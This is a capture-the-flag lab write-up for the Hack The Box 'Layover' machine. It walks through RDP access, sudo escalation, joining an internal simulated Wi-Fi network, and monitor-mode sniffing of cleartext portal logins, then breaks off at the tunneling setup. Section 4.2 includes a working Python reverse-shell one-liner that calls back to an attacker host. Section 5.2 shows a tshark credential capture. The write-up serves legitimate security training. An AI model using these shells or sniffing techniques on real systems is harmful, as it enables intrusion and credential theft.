---
link: https://app.hackthebox.com/machines/Layover
difficulty: Medium
os: Linux
pov: red
release date: 2026-09-26
tags:
  - SN_12
image: https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a2cc2776-5507-42ae-b9d0-3346ff823ce7-1789977190.png
solved:
solve date:
machine no.: 1
---

<div style="text-align: center; padding: 80px 40px; page-break-after: always;">

  <img src="/ASSETS/writeup_hack_the_box_logo.png" style="width: 1220px; margin-bottom: 60px;" />

  <div><p style="font-size: 40px; font-weight: 600; margin-bottom: 40px;">Layover Writeup</p></div>

  <img src="https://cdn.services-k8s.prod.aws.htb.systems/content/machines/avatar/a2cc2776-5507-42ae-b9d0-3346ff823ce7-1789977190.png" style="width: 400px; margin-bottom: 60px;" />

  <div style="font-size: 22px; line-height: 2.2;">
    <p style="margin: 0;">Prepared by: <a href="https://app.hackthebox.com/users/1809572">nedmoeca</a></p>
    <p style="margin: 0;">Author(s): <a href="https://app.hackthebox.com/users/31190">TRX</a></p>
    <p style="margin: 0;">Difficulty: Medium</p>
    <p style="margin: 0;">Date: DD Month Year</p>
  </div>

</div>
<!-- PAGE BREAK -->

## Summary


<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 1. Reconnaissance & Discovery
### 1.1 Connect to Hack The Box

First, download your personalized `.ovpn` file from Hack The Box.

Connect to the HTB VPN using the `.ovpn` configuration file. This establishes a secure tunnel that allows access to the target machine’s internal network.

Command: `sudo openvpn your_file.ovpn`

Start the Machine.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.2 Store the target address in a shell variable

**Command:**

```bash
IP=TARGET_IP
echo $IP
```

To clear the variable:

```bash
unset IP
```
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.3 Confirm target reachability

Before scanning, verify the host answers over the VPN and read the TTL for a first, free OS guess. A dead host wastes a long full-port scan; a live one with a tell-tale TTL saves you a question later.

**Command:** `ping -c 4 TARGET_IP`

**Breakdown:**

|Component|Reasoning|
|---|---|
|`ping`|Sends ICMP echo-request packets and waits for echo-replies to prove L3 reachability.|
|`-c 4`|Stop after 4 packets instead of running forever, so the command returns on its own.|
|`$IP`|Session variable holding the target address, resolved to TARGET_IP.|

**Result:**

```
PING TARGET_IP (TARGET_IP) 56(84) bytes of data.
64 bytes from TARGET_IP: icmp_seq=1 ttl=63 time=220 ms
64 bytes from TARGET_IP: icmp_seq=2 ttl=63 time=269 ms
64 bytes from TARGET_IP: icmp_seq=3 ttl=63 time=215 ms
64 bytes from TARGET_IP: icmp_seq=4 ttl=63 time=217 ms

--- TARGET_IP ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3007ms
rtt min/avg/max/mdev = 215.351/230.282/269.199/22.518 ms
```

Key findings:

- Host is up: 4/4 replies, 0% packet loss (evidence).
- `ttl=63` implies an original TTL of 64 decremented by one hop, which is the Linux default, so the target is likely Linux (inference, to be confirmed by the service banners).
- Average RTT ~230 ms is pure VPN latency, so expect sluggish interactive sessions and plan to drop to a reverse shell early (inference).

**Next:** With the host confirmed alive, enumerate every open TCP port to map the full attack surface.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 1.4 Port Scan with Nmap

Before we can attack a system, we need to find out what "doors" are open. Doors in this context are ports. We use a tool called **Nmap** (Network Mapper) to scan the target's IP address and see what services are running.

#### 1.4.1 Full Port Sweep

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

Begin enumeration by discovering every open port on the target. Run a fast scan across all 65,535 ports to build a complete picture of the attack surface before committing to deeper inspection.

**Command:**

```bash
# fast all-ports sweep, piped through the grapo helper to extract open ports
nmap -p- --min-rate 5000 -Pn TARGET_IP | grapo
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`nmap -p-`|Scan all 65,535 TCP ports, not just nmap's top 1,000 default, so no odd service is missed.|
|`--min-rate 5000`|Send at least 5,000 packets/sec; counters the ~230 ms VPN latency that would otherwise make a full sweep crawl.|
|`-Pn`|Skip host-discovery ping and treat the host as up; reachability was already proven in 1.1.|
|`\| grapo`|Custom zsh helper: tees nmap output to the terminal and emits the open ports as a comma-separated list for reuse in the next scan.|

**Result:**

```
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 39.75 seconds

22,3389
```

**What this gives you:**

Key findings:

- Only two TCP ports are open across the full range: 22 (ssh) and 3389 (ms-wbt-server).
- `grapo` emits `22,3389` as a ready-to-paste port list for the targeted scan.
- A very small external surface with no web port is an early sign the real targets sit on an internal segment (pivoting).

**Next:** Run a version and default-script scan against only the two open ports to fingerprint the services and lock down the OS.
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.2 Fingerprint services and OS on open ports

**Command:**

```bash
nmap -A -p 22,3389 TARGET_IP
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`nmap -A`|Aggressive scan: enables `-sV` version detection, `-sC` default scripts, OS detection, and traceroute in one flag.|
|`-p 22,3389`|Restrict the heavy scan to the two confirmed-open ports from 1.2, keeping it fast.|

**Result:**

```
PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.19 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
3389/tcp open  ms-wbt-server Microsoft Terminal Service
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows
```
<div align="center">
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
</div>

#### 1.4.3 Scan Results Analysis

|Port|Service|Version|Analysis|Simple Explanation|
|---|---|---|---|---|
|22/tcp|ssh|OpenSSH 9.6p1 Ubuntu 3ubuntu13.19|Ubuntu banner confirms Linux; SSH is restricted on this box, so not the intended entry despite having creds.|The normal remote-login door. It's locked to us here, so we don't use it to get in.|
|3389/tcp|ms-wbt-server|Microsoft Terminal Service (xrdp)|RDP on Linux = xrdp; PAM-backed graphical desktop. Supplied creds `contractor / Contractor2026!` target this.|A "remote screen" door. On Linux this is xrdp, giving a full graphical desktop instead of a text shell. This is our way in.|

**What this gives you:**

Key findings:

- Target OS is Ubuntu Linux, confirmed by the OpenSSH banner. The conflicting "MikroTik RouterOS" OS-detection guess is flagged unreliable by nmap's own warning (no open+closed port pair for the fingerprint) and is discarded.
- RDP on a Linux host indicates xrdp; because xrdp authenticates against local PAM, the handed-out RDP credentials are also local user credentials.
- Absence of any external web service (no 80/443) confirms the target web application lives on an unreachable internal segment, consistent with a pivoting engagement.

**Next:** Use the supplied `contractor / Contractor2026!` credentials against xrdp on 3389 to land a graphical foothold on the workstation; SSH is restricted, so RDP is the intended entry.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 2. Initial Access: Foothold via RDP (xrdp)

### Connect to the Linux desktop as contractor:

**Why this step:** Recon showed xrdp on 3389 and supplied `contractor / Contractor2026!`, with SSH not accepting this account. RDP is the intended door, so use it to land a graphical session on the workstation.

**Command:**

bash

```bash
xfreerdp3 /v:TARGET_IP /u:contractor /p:'Contractor2026!' /cert:ignore /dynamic-resolution /sec:tls
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`xfreerdp3`|FreeRDP 3 command-line RDP client. Every option is a single unbroken `/flag:value` token; a space after the colon splits the argument and aborts with "Unsupported command line syntax."|
|`/v:TARGET_IP`|The victim host to connect to.|
|`/u:contractor`|Username supplied by HTB.|
|`/p:'Contractor2026!'`|Password, single-quoted so Bash treats `!` literally instead of triggering history expansion. No space between `/p:` and the value.|
|`/cert:ignore`|xrdp presents a self-signed certificate Kali does not trust; connect anyway rather than aborting on validation.|
|`/dynamic-resolution`|Allow the RDP window to resize dynamically, keeping the laggy desktop workable.|
|`/sec:tls`|Force TLS security negotiation, which modern xrdp expects.|

**Result:** Session established. Title bar shows `FreeRDP: TARGET_IP`; desktop is XFCE logged in as `contractor`. Log output confirms a successful connect (framebuffer init, dynamic virtual channels `ainput` / `rdpgfx` / `disp` / `rdpsnd` loaded); the `/p is insecure`, `/cert:ignore` DANGER, and `BB_ERROR_BLOB` license warnings are benign and expected against xrdp.

![[layover_rdp_desktop.png]]

**What this gives you:**

Key findings:

- Graphical foothold as the `contractor` user on the workstation (host `airside-ws01`, to be confirmed at a terminal prompt).
- The desktop is Linux XFCE served by xrdp, giving GUI access (useful later for the Wi-Fi network applet) but not a fast shell.

**Next:** Open a terminal in the Xfce session and check `sudo -l` to assess local privilege on the workstation before doing any heavier work.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 3. Privilege Escalation (Workstation): sudo misconfiguration → root

### 3.1 Enumerate sudo rights for contractor:

**Why this step:** With a shell as `contractor` on airside-ws01 (2.1), the fastest local-privilege check is the sudo policy. A permissive entry is the most common instant-win on Linux.

**Command:**

```bash
sudo -l
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`sudo -l`|List the sudo privileges granted to the current user, as defined in `/etc/sudoers`, without running anything. Prompts for the user's own password on first use.|

**Result:**

```
Matching Defaults entries for contractor on airside-ws01:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin, use_pty

User contractor may run the following commands on airside-ws01:
    (ALL : ALL) ALL
```

**What this gives you:**

Key findings:

- `contractor` may run `(ALL : ALL) ALL`: any command, as any user, as any group, on this host. This is full administrative control.
- Escalation requires only contractor's own password (already known), with no restriction on the command.

###### Reading the sudoers grant:

The entry `(ALL : ALL) ALL` has three fields. The first `ALL` is the set of users the command may be run as (any user, root included). The `ALL` inside the parentheses is the set of groups it may be run as. The final `ALL` is the set of permitted commands. All three being `ALL` means the user can execute any command as anyone, which is equivalent to unrestricted root.

**Next:** Invoke a root shell with `sudo su` to take full control of the workstation, then use that access to enumerate network interfaces for the pivot.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 3.2 Escalate to root on the workstation:

**Why this step:** `sudo -l` (3.1) returned `(ALL : ALL) ALL`, so a root shell is one command away. Take it to unlock root-only resources, principally the network interfaces needed for the pivot.

**Command:**

```bash
sudo su
whoami ; id
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`sudo su`|Run `su` (switch user, defaulting to root) under sudo. Because the sudoers entry permits any command as any user, this drops straight into a root shell. Reuses the cached sudo timestamp, so no re-prompt.|
|`whoami ; id`|Confirm the new identity: `whoami` prints the username, `id` prints the full uid/gid/groups so there is no doubt about the privilege level.|

**Result:**

```
root@airside-ws01:/home/contractor# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
```

**What this gives you:**

Key findings:

- Full root (`uid=0`) on airside-ws01, confirmed by `id`.
- No user or root flag resides on this host; its value is as a pivot. Root is required for the next phase (bringing up and reconfiguring the hidden wireless interfaces).

**Next:** Enumerate all network interfaces as root to find the pivot path inward; the external interface only reaches HTB, so look for additional (likely wireless) segments.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 4. Internal Network Discovery

### 4.1 Enumerate network interfaces on the pivot:

**Why this step:** Root on airside-ws01 (3.2) is only useful for what it reaches. The external interface sees HTB but not the internal targets, so enumerate every interface to find the inward path.

**Command:**

```bash
ip -br a
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`ip -br a`|`ip address` in brief mode: one line per interface showing name, operational state, and assigned addresses. Fast way to spot non-standard interfaces.|

**Result:**

```
lo               UNKNOWN        127.0.0.1/8 ::1/128
wlan2            DOWN
wlan3            DOWN
eth0@if11        UP             TARGET_IP/24 metric 100 fd42:3ff5:6554:20e5:216:3eff:fe83:ea41/64 fe80::216:3eff:fe83:ea41/64
```

**What this gives you:**

Key findings:

- `eth0@if11` is the external (HTB-facing) interface holding the workstation's 10.x.x.x/24 address; the `@if11` suffix marks it as one end of a veth pair (container networking). Per the engagement notes, this interface must not be used as the pivot route.
- `wlan2` and `wlan3` are two wireless interfaces, both `DOWN`. Wireless radios on a workstation indicate simulated Wi-Fi via the kernel `mac80211_hwsim` module.
- The two radios serve distinct roles in the plan: `wlan2` as the client interface to associate with the internal Wi-Fi (obtaining an address on the hidden internal subnet), and `wlan3` as a monitor-mode interface to sniff traffic on that network.

###### What mac80211_hwsim is (beginner theory):

A normal Wi-Fi interface is backed by a physical radio (a PCIe or USB card). In a virtualized HTB box there is no physical hardware, so the Linux kernel loads `mac80211_hwsim`, a module that creates fully software-simulated wireless radios. To every userland tool (`iw`, `nmcli`, `wpa_supplicant`, `tshark`) these behave exactly like real adapters: they can scan for access points, associate with an SSID, pull a DHCP lease, and be flipped into monitor mode. The box uses this to build an internal wireless network segment that is only reachable from this workstation, which is precisely what forces the pivot.

**Next:** Bring up `wlan2` and scan for the internal access point to learn its SSID, channel, and security, then associate to obtain an address on the internal subnet.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.2 Escape the RDP session to a stable reverse shell on Kali:

**Why this step:** The xrdp desktop is laggy and self-terminates, which would kill any in-progress work. A reverse shell is a plain TCP socket independent of the GUI, so it survives the desktop dropping and gives a fast terminal for the wireless and tunneling work ahead. For this hop the callback goes to Kali's `tun0`, because the workstation's external interface can reach the VPN.

**Command:**

```bash
# On Kali: start the listener FIRST (order matters; a late listener yields "Connection refused")
nc -lvnp 4444

# On airside-ws01 (root RDP terminal): fire the reverse shell to Kali tun0
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("KALI_TUN0_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`nc -lvnp 4444`|Listener on Kali: `-l` listen, `-v` verbose (prints the connect line), `-n` no DNS, `-p 4444` port. Must be running before the client connects or the target gets `Connection refused`.|
|`python3 -c '...'`|One-liner reverse shell; Python is present on the target and reliable for this.|
|`socket.socket();s.connect(("KALI_TUN0_IP",4444))`|Open a TCP connection back to the Kali listener.|
|`os.dup2(s.fileno(),0/1/2)`|Duplicate the socket onto file descriptors 0, 1, 2 (stdin/stdout/stderr), rewiring the process's standard streams onto the network.|
|`subprocess.call(["/bin/bash","-i"])`|Spawn an interactive bash; with the streams already redirected, its I/O flows over the socket to Kali.|

**Result:**

```
listening on [any] 4444 ...
connect to [KALI_TUN0_IP] from (UNKNOWN) [TARGET_IP] 59582
root@airside-ws01:/home/contractor#
```

**Next:** Upgrade the dumb shell to a full PTY so `sudo`/`su`, job control, and line editing behave, then begin wireless enumeration on `wlan2`.
<div align="center">
<br>
<br>
</div>

###### Stabilize the shell to a full PTY

**Why this step:** The caught shell is a raw pipe with no controlling terminal, so `su`, `sudo`, and job control misbehave and an accidental Ctrl-C kills the session. Promote it to a real pseudo-terminal before doing interactive work.

**Command:**

```bash
# In the caught shell:
python3 -c 'import pty;pty.spawn("/bin/bash")'; export TERM=xterm-256color
# then press Ctrl-Z to background it

# On Kali:
stty raw -echo; fg
# press Enter twice
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`python3 -c 'import pty;pty.spawn("/bin/bash")'`|Allocate a pseudo-terminal and run bash inside it, giving the shell a real controlling TTY.|
|`export TERM=xterm-256color`|Tell programs what terminal type they are on, so screen-drawing tools (editors, pagers) render correctly.|
|`Ctrl-Z`|Suspend the local `nc`, returning control to Kali so terminal settings can be changed.|
|`stty raw -echo`|Put the local terminal in raw mode and disable local echo, so keystrokes pass straight to the remote PTY without double-printing.|
|`fg`|Resume `nc` in the foreground, reconnecting to the now-raw terminal.|

**Result:**

```
root@airside-ws01:/home/contractor#   (fully interactive: job control, su/sudo, and line editing now work)
```

**Next:** Bring `wlan2` up and scan for the internal access point to learn its SSID, channel, and security posture.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.3 Scan for the internal access point on wlan2

**Why this step:** `wlan2` is a client radio (4.1) but was down and silent. Bring it up and scan to learn the internal network's name, channel, and security before attempting to join, and to record the channel needed for monitor-mode sniffing later.

**Command:**

```bash
ip link set wlan2 up
iw dev wlan2 scan | grep -iE 'SSID|signal|DS Parameter|channel'
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`ip link set wlan2 up`|Enable the interface so its radio can transmit probe requests and receive beacons. A down radio hears nothing.|
|`iw dev wlan2 scan`|Perform an active 802.11 scan on wlan2, dumping every access point's beacon/probe-response details.|
|`grep -iE 'SSID\|signal\|DS Parameter\|channel'`|Filter the verbose scan to the fields that matter: network name, signal strength, and operating channel.|

**Result:**

```
        signal: -30.00 dBm
        SSID: HTB International WiFi
        DS Parameter set: channel 6
                 * Extended Channel Switching
                 * Multiple BSSID
                 * SSID List
```

**What this gives you:**

Key findings:

- Internal access point identified: SSID `HTB International WiFi`, operating on **channel 6**, signal `-30 dBm` (strong).
- No RSN/WPA information element present, so the network is **open** (no encryption). This permits association without a key and, crucially, means traffic traverses the air in cleartext and can be sniffed.
- Channel 6 is the value to tune the monitor interface (wlan3) to later; a monitor interface only receives on the single channel it is set to.

**Observation:** `wlan2` reads `DOWN` again in `ip -br a` immediately after a successful scan, indicating a service (NetworkManager or wpa_supplicant) is reclaiming the radio. Manual wireless management is therefore preferred for stable association and for monitor mode.

**Next:** Associate `wlan2` with the open AP and obtain a DHCP lease to gain an address on the internal subnet.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.4 Associate with the internal Wi-Fi and obtain a lease

**Why this step:** The AP is confirmed open on channel 6 (4.3). Associating `wlan2` and pulling a DHCP lease places the workstation on the internal subnet, the prerequisite for reaching the internal portal and for tunneling that network back to Kali.

**Command:**

```bash
nmcli device wifi connect "HTB International WiFi" ifname wlan2
ip -br a
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`nmcli device wifi connect "HTB International WiFi"`|Instruct NetworkManager to associate with the named open SSID. For an unencrypted network no key argument is needed.|
|`ifname wlan2`|Bind the connection to the client radio (not wlan3, which is reserved for monitor-mode sniffing).|
|`ip -br a`|Verify the interface came up and received an address on the internal subnet.|

**Result:**

```
wlan2            UP             10.13.37.182/24 fe80::e8f1:faed:ebef:e243/64
```

**What this gives you:**

Key findings:

- `wlan2` is associated and holds `10.13.37.182/24`, placing the workstation on the internal network `10.13.37.0/24`.
- The workstation is now dual-homed: `eth0` on the HTB-facing net and `wlan2` on the internal net. All subsequent internal access (ligolo route advertisement, internal reverse-shell callbacks) uses the `wlan2` address `10.13.37.182`.
- The internal portal `portal.international.htb` is expected on this subnet (to be confirmed).

**Next:** Put the second radio `wlan3` into monitor mode on channel 6 and sniff the open network for cleartext credentials, since `contractor` creds do not work on the internal portal and another user's login must be captured.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 4.5 Confirm the internal portal and read the captive-portal notice

**Why this step:** With an address on `10.13.37.0/24` (4.4), verify the leaked target is reachable from the pivot and capture any information the captive portal exposes before committing to the sniffing attack.

**Command:**

```bash
ping -c 2 10.13.37.10
curl -s -I http://10.13.37.10/
curl -s http://wifi.international.htb/ 2>/dev/null | grep -iE 'portal|miles|international'
```

**Breakdown:**

| Component                                            | Reasoning                                                                                                             |
| ---------------------------------------------------- | --------------------------------------------------------------------------------------------------------------------- |
| `ping -c 2 10.13.37.10`                              | Confirm the portal host is up on the internal segment and read its TTL to gauge network distance.                     |
| `curl -s -I http://10.13.37.10/`                     | Fetch only HTTP response headers (`-I`) silently (`-s`) to fingerprint the web server without pulling the whole page. |
| `curl -s http://wifi.international.htb/ \| grep ...` | Retrieve the captive-portal page and filter for the leaked internal hostnames and paths.                              |

**Result:**

```
64 bytes from 10.13.37.10: icmp_seq=1 ttl=64 time=0.311 ms
64 bytes from 10.13.37.10: icmp_seq=2 ttl=64 time=0.254 ms

Server: nginx/1.24.0 (Ubuntu)
HTTP/1.1 200 OK
Content-Type: text/html

<title>HTB International WiFi</title>
  <a class="btn" href="http://portal.international.htb/">Accept &amp; continue to airport portal</a>
    <b>HTB Airways staff notice:</b> the <b>HTB Airways Miles</b> employee portal is
    <code>http://portal.international.htb/miles/</code>. Please sign in periodically to
    verify your Miles balance and lounge bookings.
```

Result (captive portal in RDP desktop browser):

![[layover_captive_portal.png]]

**What this gives you:**

Key findings:

- `10.13.37.10` is up with `ttl=64` and sub-millisecond RTT, indicating the portal is on the same L2 segment as `wlan2` (zero hops), directly reachable.
- Web server is `nginx/1.24.0 (Ubuntu)`, serving over plain HTTP (no TLS).
- The captive portal leaks the internal targets: `http://portal.international.htb/` (mapped to `10.13.37.10`) and the employee area `http://portal.international.htb/miles/`.
- The staff notice instructs employees to sign in periodically, which is what generates the authentication traffic the sniffing attack will capture.

**Next:** Because the network is open and the portal uses plain HTTP, put `wlan3` into monitor mode on channel 6 and passively capture HTTP POST logins to harvest a valid user's credentials.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 5. Credential Interception (Wireless Sniffing)

### 5.1 Put wlan3 into monitor mode on the AP's channel:

**Why this step:** The internal portal needs credentials that `contractor` does not have (4.5). The network is open and uses plain HTTP, so another user's login can be captured off the air. Monitor mode on the second radio lets wlan3 passively receive all 802.11 frames on the AP's channel without associating.

**Command:**

```bash
systemctl stop NetworkManager
killall wpa_supplicant 2>/dev/null
ip link set wlan3 down
iw dev wlan3 set type monitor
ip link set wlan3 up
iw dev wlan3 set channel 6
iw dev wlan3 info
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`systemctl stop NetworkManager`|Stop the service that would otherwise reclaim the radio and reset its mode/channel mid-capture.|
|`killall wpa_supplicant`|Kill any supplicant still holding a radio, for the same reason.|
|`ip link set wlan3 down`|An interface's type cannot be changed while it is up.|
|`iw dev wlan3 set type monitor`|Switch the radio from managed to monitor mode so it delivers every frame it hears, regardless of destination MAC.|
|`ip link set wlan3 up`|Bring the interface back up in the new mode.|
|`iw dev wlan3 set channel 6`|Tune the radio to the AP's channel (from 4.3); monitor mode only receives on the single channel it is set to.|
|`iw dev wlan3 info`|Verify the configuration: expect `type monitor` and `channel 6`.|

**Result:**

```
Interface wlan3
        ifindex 7
        addr 02:00:00:00:03:00
        type monitor
        wiphy 3
        channel 6 (2437 MHz), width: 20 MHz (no HT), center1: 2437 MHz
        txpower 20.00 dBm
```

**What this gives you:**

Key findings:

- `wlan3` is confirmed in `type monitor` on `channel 6`, ready to passively capture all traffic on the AP's frequency.
- With NetworkManager stopped, no service will reset the interface during capture.

###### Managed vs monitor mode (beginner theory):

A wireless interface normally runs in managed (infrastructure) mode, where the card's firmware filters out every frame not addressed to its own MAC address, plus broadcasts, to save CPU. That means a managed interface cannot see other clients' traffic. Monitor mode (RFMON) disables that filtering: the radio hands the operating system every 802.11 frame it receives on its current channel, no matter who it is addressed to. Two constraints follow. First, no other process may manage the radio, or it will keep knocking it out of monitor mode. Second, the radio only hears the one channel it is tuned to, so the capture channel must match the target AP's channel exactly; a mismatch produces an empty capture even though everything else is set up correctly.

**Next:** Run tshark on `wlan3` filtered to HTTP POST requests and wait for a staff login, extracting the submitted username and password fields.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

### 5.2 Capture cleartext credentials with tshark

**Why this step:** With wlan3 in monitor mode on channel 6 (5.1) and the portal using plain HTTP over an open network, a staff login can be read directly off the air. Filter for HTTP POST form submissions and extract the credential fields.

**Command:**

```bash
tshark -i wlan3 -a duration:120 \
  -Y 'http.request.method=="POST"' \
  -T fields -e frame.time -e wlan.sa -e ip.src -e http.host \
            -e http.request.uri -e urlencoded-form.key -e urlencoded-form.value
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`tshark -i wlan3`|Capture on the monitor-mode interface, which receives all frames on channel 6.|
|`-a duration:120`|Auto-stop after 120 seconds so the command returns; re-run with a longer window if no login occurs in that time.|
|`-Y 'http.request.method=="POST"'`|Display filter limiting output to HTTP POST requests, i.e. form submissions such as logins.|
|`-T fields`|Output selected fields only, rather than the default packet summary.|
|`-e frame.time -e wlan.sa -e ip.src -e http.host -e http.request.uri`|Print timestamp, sender MAC, source IP, target host, and request path for context.|
|`-e urlencoded-form.key -e urlencoded-form.value`|Print the decoded form field names and their values: the username and password.|

**Result:**

```
Oct  3, 2026 14:31:03 UTC  02:00:00:00:01:00  10.13.37.132  portal.international.htb  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!
Oct  3, 2026 14:31:43 UTC  02:00:00:00:01:00  10.13.37.132  portal.international.htb  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!
Oct  3, 2026 14:32:23 UTC  02:00:00:00:01:00  10.13.37.132  portal.international.htb  /miles/login.php  username,password  jenny,Fl1ghtDeck2026!
3 packets captured
```

**What this gives you:**

Key findings:

- Cleartext credentials captured: **`jenny` / `Fl1ghtDeck2026!`**, POSTed to `portal.international.htb/miles/login.php` from internal client `10.13.37.132`.
- The capture repeats on a ~40-second interval, confirming a scripted staff login and validating the channel/filter setup.
- These credentials belong to the internal portal (Craft CMS) and are reused to authenticate to the Craft control panel for the next phase.

###### Why the credentials were readable (theory):

Two missing protections stack here. The Wi-Fi is an open network, so frames are not encrypted at the link layer, and the portal serves over HTTP rather than HTTPS, so there is no TLS at the application layer either. With neither in place, the POST body travels as plaintext bytes that any monitor-mode radio tuned to the correct channel can read. Adding either WPA2 on the Wi-Fi or TLS on the site would have defeated this capture.

**Next:** Build a network tunnel from Kali through the pivot so Kali's browser and tooling can reach `portal.international.htb` directly, then log into the Craft CMS control panel as jenny.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
<br>
</div>
<!-- PAGE BREAK -->
<div style="page-break-after: always;"></div>

## 6. Pivoting with ligolo-ng

### 6.1 Restore the internal Wi-Fi leg manually (post-NetworkManager)

**Why this step:** Stopping NetworkManager for monitor mode (5.1) dropped the wlan2 association, leaving it `DOWN`. The tunnel's agent forwards traffic out through wlan2, so the internal leg must be re-established first, this time with wpa_supplicant so it does not depend on the stopped NetworkManager.

**Command:**

```bash
pkill -9 -f "wpa_supplicant.*wlan2" 2>/dev/null; rm -rf /run/wpa_supplicant; mkdir -p /run/wpa_supplicant
ip link set wlan2 down; sleep 1; ip link set wlan2 up; sleep 2
cat > /tmp/wpa-open.conf <<'EOF'
ctrl_interface=/run/wpa_supplicant
update_config=1
network={
    ssid="HTB International WiFi"
    key_mgmt=NONE
    scan_ssid=1
}
EOF
wpa_supplicant -B -i wlan2 -c /tmp/wpa-open.conf -D nl80211 -f /tmp/wpa.log
sleep 6
iw dev wlan2 link
dhcpcd -t 15 wlan2 || dhclient wlan2
ip -br a show wlan2
```

**Breakdown:**

|Component|Reasoning|
|---|---|
|`pkill ...; rm -rf /run/wpa_supplicant; mkdir`|Clear any stale supplicant process and its control socket so a fresh instance can bind.|
|`ip link set wlan2 down; up`|Reset the interface cleanly before re-associating.|
|heredoc `/tmp/wpa-open.conf`|Minimal supplicant config. `key_mgmt=NONE` declares an open network (no PSK negotiation); `scan_ssid=1` actively probes for the SSID.|
|`wpa_supplicant -B -i wlan2 -c ... -D nl80211 -f ...`|Run the supplicant backgrounded on wlan2 with that config, using the nl80211 driver, logging to `/tmp/wpa.log`.|
|`iw dev wlan2 link`|Confirm association to the AP.|
|`dhcpcd -t 15 wlan2 \| dhclient wlan2`|Request a DHCP lease (dhcpcd, falling back to dhclient).|
|`ip -br a show wlan2`|Verify the interface holds an internal address.|

**Result:**

```
wlan2: connected to Access Point: HTB International WiFi
wlan2: offered 10.13.37.183 from 10.13.37.1
wlan2: leased 10.13.37.183 for 43200 seconds
wlan2: adding route to 10.13.37.0/24
wlan2            UP             10.13.37.183/24 fe80::ebc3:c708:b5e:e7a7/64
```

**What this gives you:**

Key findings:

- `wlan2` is re-associated via wpa_supplicant and holds `10.13.37.183/24` (the lease differs from the earlier `.182`; the current internal address is `10.13.37.183`).
- This address is the one later internal reverse-shell callbacks must target, because the internal portal cannot route to Kali.
- Monitor-mode `wlan3` is unaffected; the two radios are independent.

**Next:** Transfer the ligolo agent to the pivot, start the proxy on Kali, connect the agent, and autoroute the internal `/24`.
<div align="center">
<br>
<br>
※※※※※※※※※※※※※※※※※※※※※※※※
<br>
<br>
<br>
</div>

